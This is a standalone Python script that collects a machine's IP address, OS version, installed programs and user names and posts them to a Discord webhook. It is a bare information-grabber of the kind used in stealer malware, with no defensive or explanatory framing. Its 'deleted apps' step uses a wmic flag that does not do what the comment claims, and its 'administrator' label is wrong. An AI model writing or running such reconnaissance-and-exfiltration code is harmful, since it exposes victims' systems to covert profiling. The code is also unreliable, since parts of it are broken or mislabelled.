import os
import requests
import socket
import getpass
import platform

# Get IP address
ip_address = socket.gethostbyname(socket.gethostname())

# Get OS info and version
os_name = platform.system()
os_version = platform.release()

# Get installed apps
installed_apps = os.popen('wmic product get name').read()
# You can customize the command to retrieve the installed apps based on your OS

# Get deleted apps
deleted_apps = os.popen('wmic product get name /EVERY').read()
# You can customize the command to retrieve the deleted apps based on your OS

# Get administrator username
admin_username = getpass.getuser()

# Get desktop username
desktop_username = os.getlogin()

# Create the embedded message
embed = {
    'title': 'System Information',
    'description': f'IP Address: {ip_address}\n'
                   f'OS: {os_name} {os_version}\n'
                   f'Installed Apps:\n{installed_apps}\n'
                   f'Deleted Apps:\n{deleted_apps}\n'
                   f'Administrator Username: {admin_username}\n'
                   f'Desktop Username: {desktop_username}\n'
}

# Send the embedded message to Discord webhook
webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
response = requests.post(webhook_url, json={'embeds': [embed]})

# Check if the message was sent successfully
if response.status_code == 204:
    print('System information sent to Discord webhook.')
else:
    print('Failed to send system information to Discord webhook.')
